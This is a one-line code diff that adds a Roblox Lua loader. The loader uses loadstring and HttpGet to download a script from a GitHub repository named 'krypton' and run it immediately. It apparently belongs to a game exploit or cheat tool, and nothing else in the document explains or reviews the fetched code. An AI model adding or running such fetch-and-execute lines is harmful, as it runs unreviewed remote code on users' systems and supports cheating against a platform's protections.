@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Tranta12/krypton/refs/heads/main/MainScript.lua"))()
